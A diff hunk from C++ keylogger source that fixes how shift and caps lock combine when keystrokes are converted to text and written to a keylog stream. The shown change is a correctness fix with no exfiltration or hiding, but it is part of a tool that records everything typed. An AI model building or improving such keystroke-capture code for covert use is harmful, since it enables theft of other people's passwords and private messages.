@@ -91,13 +91,12 @@ int main() {
 
         if (ev.value == 1) {
           std::string key_str = key_code_to_string(ev.code);
-          if (shift) {
+          if (key_str.size() == 1 && std::isalpha(key_str.back())) { // letter
+            if (shift ^ caps_lock) {
+              key_str = key_str.back() - ('a' - 'A');
+            }
+          } else if (shift) {
             key_str = map_to_shift(ev.code);
-          }
-          if (key_str.size() == 1 && std::isalpha(key_str.back()) &&
-              caps_lock) {
-
-            key_str = key_str.back() - ('a' - 'A');
           }
 
           keylog << "Key Pressed: " << key_str << std::endl;
